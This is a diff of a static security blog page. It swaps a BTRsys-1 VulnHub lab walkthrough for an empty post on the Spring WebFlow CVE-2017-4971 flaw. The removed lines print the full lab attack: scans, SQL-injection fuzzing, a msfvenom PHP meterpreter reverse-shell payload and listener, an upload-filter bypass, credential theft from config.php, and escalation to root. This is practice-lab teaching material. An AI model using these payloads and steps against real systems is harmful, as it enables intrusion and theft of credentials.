@@ -4,13 +4,8 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="综合实战第二章-BTRsys-1, Broken-year">
-    <meta name="description" content="综合实战第二章大综合实战1环境准备
-靶场下载地址：https://www.vulnhub.com/entry/btrsys-v1,195/
-攻击机：kali 192.168.3.134
-靶机：BTRsys1 192.168.3.160
-
-信">
+    <meta name="keywords" content="Spring-WebFlow远程代码执行漏洞(CVE-2017-4971), Broken-year">
+    <meta name="description" content="">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -22,7 +17,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>综合实战第二章-BTRsys-1 | Broken-year</title>
+    <title>Spring-WebFlow远程代码执行漏洞(CVE-2017-4971) | Broken-year</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
@@ -314,12 +309,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/4.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/17.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">综合实战第二章-BTRsys-1</h1>
+                    <h1 class="description center-align post-title">Spring-WebFlow远程代码执行漏洞(CVE-2017-4971)</h1>
                 </div>
             </div>
         </div>
@@ -439,16 +434,20 @@
                                 <span class="chip bg-color">网络安全</span>
                             </a>
                         
-                            <a href="/tags/%E7%BB%BC%E5%90%88%E5%AE%9E%E6%88%98/">
-                                <span class="chip bg-color">综合实战</span>
+                            <a href="/tags/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/">
+                                <span class="chip bg-color">环境搭建</span>
                             </a>
                         
-                            <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">
-                                <span class="chip bg-color">渗透测试</span>
+                            <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">
+                                <span class="chip bg-color">漏洞复现</span>
                             </a>
                         
-                            <a href="/tags/%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/">
-                                <span class="chip bg-color">靶场练习</span>
+                            <a href="/tags/CVE/">
+                                <span class="chip bg-color">CVE</span>
+                            </a>
+                        
+                            <a href="/tags/Spring/">
+                                <span class="chip bg-color">Spring</span>
                             </a>
                         
                     </div>
@@ -459,8 +458,8 @@
                     <div class="post-cate">
                         <i class="fas fa-bookmark fa-fw icon-category"></i>
                         
-                            <a href="/categories/%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/" class="post-category">
-                                靶场练习
+                            <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" class="post-category">
+                                漏洞复现
                             </a>
                         
                     </div>
@@ -472,7 +471,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2022-04-28
+                    2022-05-06
                 </div>
                 
 
@@ -493,103 +492,7 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="综合实战第二章"><a href="#综合实战第二章" class="headerlink" title="综合实战第二章"></a>综合实战第二章</h1><h2 id="大综合实战1"><a href="#大综合实战1" class="headerlink" title="大综合实战1"></a>大综合实战1</h2><h3 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h3><blockquote>
-<p>靶场下载地址：<a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/btrsys-v1,195/">https://www.vulnhub.com/entry/btrsys-v1,195/</a></p>
-<p>攻击机：kali 192.168.3.134</p>
-<p>靶机：BTRsys1 192.168.3.160</p>
-</blockquote>
-<h3 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h3><p>先用nmap扫一下</p>
-<pre class=" language-Linux"><code class="language-Linux">nmap -p- -A 192.168.3.160
-</code></pre>
-<p><img src="/2022/04/28/btrsys-1/image-20220428195737162.png" alt="image-20220428195737162"></p>
-<p>发现有21,22,80端口</p>
-<p><img src="/2022/04/28/btrsys-1/image-20220428200012439.png" alt="image-20220428200012439"></p>
-<p>没啥东西，用别的玩意扫一下</p>
-<pre class=" language-Linux"><code class="language-Linux">nikto -h http://192.168.3.160
-</code></pre>
-<p><img src="/2022/04/28/btrsys-1/image-20220428200420050.png" alt="image-20220428200420050"></p>
-<p>看看这俩里面有啥</p>
-<p>config.php里面啥也没有</p>
-<p>login.php里面有一个登录界面</p>
-<p><img src="/2022/04/28/btrsys-1/image-20220428200733250.png" alt="image-20220428200733250"></p>
-<p>有一个登录界面，可以进行暴力破解，sql注入试试之类的</p>
-<p>先打开burpsuite</p>
-<pre class=" language-Linux"><code class="language-Linux">burpsuite
-</code></pre>
-<p>然后另起一个窗口,把sql注入测试用的玩意扔到&#x2F;root目录</p>
-<pre class=" language-Linux"><code class="language-Linux">cd /usr/share/wordlists/wfuzz/Injections
-cp SQL.txt /root/SQL.txt
-</code></pre>
-<p>接下来抓包</p>
-<p>发现需要特殊账号</p>
-<p>查看源代码发现</p>
-<p><img src="/2022/04/28/btrsys-1/image-20220428201745909.png" alt="image-20220428201745909"></p>
-<p>重新测试</p>
-<p><img src="/2022/04/28/btrsys-1/image-20220428201816194.png" alt="image-20220428201816194"></p>
-<p>抓到了</p>
-<p><img src="/2022/04/28/btrsys-1/image-20220428201924612.png" alt="image-20220428201924612"></p>
-<p>然后在密码处打标记，测试</p>
-<p><img src="/2022/04/28/btrsys-1/image-20220428202016600.png" alt="image-20220428202016600"></p>
-<p><img src="/2022/04/28/btrsys-1/image-20220428202104195.png" alt="image-20220428202104195"></p>
-<p><code>start attack</code>开始测试</p>
-<p><img src="/2022/04/28/btrsys-1/image-20220428202329875.png" alt="image-20220428202329875"></p>
-<p>有这种<code>2900</code>长度的</p>
-<p>其他的登录的话啥也没有，用这种做密码会有一个文件上传的框</p>
-<h3 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h3><p><img src="/2022/04/28/btrsys-1/image-20220428202610413.png" alt="image-20220428202610413"></p>
-<p>观察一下这个玩意</p>
-<p><img src="/2022/04/28/btrsys-1/image-20220428202723078.png" alt="image-20220428202723078"></p>
-<p>默认是需要.jpg的文件上传</p>
-<p>上传，抓包</p>
-<p><img src="/2022/04/28/btrsys-1/image-20220428202845872.png" alt="image-20220428202845872"></p>
-<p>在此之前可以先构造好一个木马文件，然后建立好监听</p>
-<pre class=" language-Linux"><code class="language-Linux">msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.3.134 lport=4444 -f raw > /root/msfshell.php
-msfconsole
-use exploit/multi/handler 
-set payload php/meterpreter/reverse_tcp
-set lhost 192.168.3.134
-set lport 4444
-run
-</code></pre>
-<p>准备上传</p>
-<p><img src="/2022/04/28/btrsys-1/image-20220428203734656.png" alt="image-20220428203734656"></p>
-<p><img src="/2022/04/28/btrsys-1/image-20220428203840890.png" alt="image-20220428203840890"></p>
-<p>这样是上传失败</p>
-<p>把木马shell.php改成shell.jpg上传，然后抓包改回php,上传成功</p>
-<p><img src="/2022/04/28/btrsys-1/image-20220428204335834.png" alt="image-20220428204335834"></p>
-<p>但是找不到木马上传到什么地方</p>
-<p>用dirsearch扫一下目录</p>
-<pre class=" language-Linux"><code class="language-Linux">dirsearch -u http://192.168.3.134
-</code></pre>
-<p><img src="/2022/04/28/btrsys-1/image-20220428204622659.png" alt="image-20220428204622659"></p>
-<p>发现<code>uploads</code>目录</p>
-<p><img src="/2022/04/28/btrsys-1/image-20220428204646554.png" alt="image-20220428204646554"></p>
-<p>木马就在里面</p>
-<p><img src="/2022/04/28/btrsys-1/image-20220428204708301.png" alt="image-20220428204708301"></p>
-<p>成了</p>
-<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>美化一下</p>
-<pre class=" language-Linux"><code class="language-Linux">python -c 'import pty;pty.spawn("/bin/bash")'
-</code></pre>
-<p>然后查看一下config.php</p>
-<pre class=" language-Linux"><code class="language-Linux">cat config.php
-</code></pre>
-<p>发现了sql的账号和密码</p>
-<p><img src="/2022/04/28/btrsys-1/image-20220428205030929.png" alt="image-20220428205030929"></p>
-<p>可以直接进数据库了</p>
-<pre class=" language-Linux"><code class="language-Linux">mysql -uroot -ptoor
-</code></pre>
-<pre class=" language-mysql"><code class="language-mysql">show databases;
-use deneme;
-show tables;
-select * from user;
-</code></pre>
-<p><img src="/2022/04/28/btrsys-1/image-20220428205257670.png" alt="image-20220428205257670"></p>
-<p>密码是<code>asd123***</code></p>
-<p>尝试su root</p>
-<pre class=" language-Linux"><code class="language-Linux">su root
-</code></pre>
-<p><img src="/2022/04/28/btrsys-1/image-20220428205438640.png" alt="image-20220428205438640"></p>
-<p>完美</p>
-
+                
                 
             </div>
             <hr/>
@@ -615,7 +518,7 @@ select * from user;
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://Broken-year.github.io/2022/04/28/btrsys-1/">http://Broken-year.github.io/2022/04/28/btrsys-1/</a>
+                    <a href="http://Broken-year.github.io/2022/05/06/Spring-WebFlow/">http://Broken-year.github.io/2022/05/06/Spring-WebFlow/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -657,16 +560,20 @@ select * from user;
                                     <span class="chip bg-color">网络安全</span>
                                 </a>
                             
-                                <a href="/tags/%E7%BB%BC%E5%90%88%E5%AE%9E%E6%88%98/">
-                                    <span class="chip bg-color">综合实战</span>
+                                <a href="/tags/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/">
+                                    <span class="chip bg-color">环境搭建</span>
                                 </a>
                             
-                                <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">
-                                    <span class="chip bg-color">渗透测试</span>
+                                <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">
+                                    <span class="chip bg-color">漏洞复现</span>
                                 </a>
                             
-                                <a href="/tags/%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/">
-                                    <span class="chip bg-color">靶场练习</span>
+                                <a href="/tags/CVE/">
+                                    <span class="chip bg-color">CVE</span>
+                                </a>
+                            
+                                <a href="/tags/Spring/">
+                                    <span class="chip bg-color">Spring</span>
                                 </a>
                             
                         </div>
@@ -840,17 +747,18 @@ select * from user;
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/2022/04/28/btrsys-2/">
+                <a href="/2022/05/06/Spring-WebFlow/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/3.jpg" class="responsive-img" alt="综合实战第二章-BTRsys-2">
+                        <img src="/medias/featureimages/17.jpg" class="responsive-img" alt="Spring-WebFlow远程代码执行漏洞(CVE-2017-4971)">
                         
-                        <span class="card-title">综合实战第二章-BTRsys-2</span>
+                        <span class="card-title">Spring-WebFlow远程代码执行漏洞(CVE-2017-4971)</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -860,21 +768,22 @@ select * from user;
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2022-04-28
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-05-06
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/" class="post-category">
-                                    靶场练习
+                            <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" class="post-category">
+                                    漏洞复现
                                 </a>
                             
                             
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
@@ -882,16 +791,20 @@ select * from user;
                         <span class="chip bg-color">网络安全</span>
                     </a>
                     
-                    <a href="/tags/%E7%BB%BC%E5%90%88%E5%AE%9E%E6%88%98/">
-                        <span class="chip bg-color">综合实战</span>
+                    <a href="/tags/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/">
+                        <span class="chip bg-color">环境搭建</span>
                     </a>
                     
-                    <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">
-                        <span class="chip bg-color">渗透测试</span>
+                    <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">
+                        <span class="chip bg-color">漏洞复现</span>
                     </a>
                     
-                    <a href="/tags/%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/">
-                        <span class="chip bg-color">靶场练习</span>
+                    <a href="/tags/CVE/">
+                        <span class="chip bg-color">CVE</span>
+                    </a>
+                    
+                    <a href="/tags/Spring/">
+                        <span class="chip bg-color">Spring</span>
                     </a>
                     
                 </div>
@@ -905,13 +818,13 @@ select * from user;
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2022/04/27/Dina/">
+                <a href="/2022/05/06/Spring-security-OAuth2/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/3.jpg" class="responsive-img" alt="综合实战第一章-命令注入实战">
+                        <img src="/medias/featureimages/5.jpg" class="responsive-img" alt="Spring Security OAuth2远程命令执行漏洞(CVE-2016-4977)">
                         
-                        <span class="card-title">综合实战第一章-命令注入实战</span>
+                        <span class="card-title">Spring Security OAuth2远程命令执行漏洞(CVE-2016-4977)</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -922,14 +835,14 @@ select * from user;
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2022-04-27
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-05-06
                             </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/" class="post-category">
-                                    靶场练习
+                            <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" class="post-category">
+                                    漏洞复现
                                 </a>
                             
                             
@@ -943,16 +856,20 @@ select * from user;
                         <span class="chip bg-color">网络安全</span>
                     </a>
                     
-                    <a href="/tags/%E7%BB%BC%E5%90%88%E5%AE%9E%E6%88%98/">
-                        <span class="chip bg-color">综合实战</span>
+                    <a href="/tags/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/">
+                        <span class="chip bg-color">环境搭建</span>
                     </a>
                     
-                    <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">
-                        <span class="chip bg-color">渗透测试</span>
+                    <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">
+                        <span class="chip bg-color">漏洞复现</span>
                     </a>
                     
-                    <a href="/tags/%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/">
-                        <span class="chip bg-color">靶场练习</span>
+                    <a href="/tags/CVE/">
+                        <span class="chip bg-color">CVE</span>
+                    </a>
+                    
+                    <a href="/tags/Spring/">
+                        <span class="chip bg-color">Spring</span>
                     </a>
                     
                 </div>
